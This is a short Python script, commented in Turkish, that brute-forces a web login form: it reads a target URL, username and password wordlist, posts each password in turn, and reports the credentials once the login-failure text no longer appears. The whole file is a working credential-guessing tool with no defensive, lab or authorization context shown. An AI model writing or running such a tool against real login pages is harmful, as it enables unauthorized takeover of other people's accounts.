import requests # requests modülünü import ediyoruz
from termcolor import colored # termcolor modülünden colored fonksiyonunu import ediyoruz

url = input('[+] Giriş yapılacak sayfanın URL adresini girin: ')
username = input('[+] Kırılacak hesabın kullanıcı adını girin: ')
password_file = input('[+] Kullanılacak parola dosyasının adını girin: ')
login_failed_string = input('[+] Giriş başarısız olduğunda görüntülenecek metni girin: ')

# cracking fonksiyonu, kullanıcı adı ve şifre denemeleri yaparak giriş işlemini gerçekleştirir
def cracking(username, url):
    with open(password_file, 'r') as passwords:
        for password in passwords:
            password = password.strip()
            print(colored(('Denenen Şifre: ' + password), 'red'))
            data = {'username': username, 'password': password, 'Login': 'submit'}
            response = requests.post(url, data=data)
            if login_failed_string in response.content.decode():
                pass
            else:
                print(colored(('[+] Kullanıcı adı bulundu: ==> ' + username), 'green'))
                print(colored(('[+] Şifre bulundu: ==> ' + password), 'green'))
                exit()

# cracking fonksiyonunu çalıştırıyoruz
cracking(username, url)

# Eğer şifre dosyasındaki tüm şifreler denendiyse ve başarılı bir giriş gerçekleştirilemediyse, aşağıdaki mesaj görüntülenir.
print('[!!] Şifre dosyasındaki tüm şifreler denendi.')
